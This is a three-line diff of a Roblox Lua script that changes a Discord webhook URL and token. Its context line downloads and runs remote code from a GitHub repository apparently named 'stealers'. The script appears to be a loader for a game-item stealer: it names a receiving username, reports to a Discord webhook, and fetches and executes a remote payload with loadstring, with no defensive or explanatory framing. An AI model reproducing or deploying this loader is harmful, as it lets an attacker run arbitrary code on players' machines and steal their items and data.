@@ -1,3 +1,3 @@
 Username = "NerfedModders" 
-Webhook = "https://discord.com/api/webhooks/1291848670525919323/l8Lz_46n4bA6YWGaW9O04S6XqQYYBR9EctXFneIiVgtNm7WY680ye7LIW4LsTxS3X8gn" 
+Webhook = "https://discord.com/api/webhooks/1327948967430066176/Fpuf2EHFD6KHR8N9J74kK6T55CBuUdLel3I6JusjXmH4wTiz7kbh5dmkRhHCOnZqjfCf" 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))()
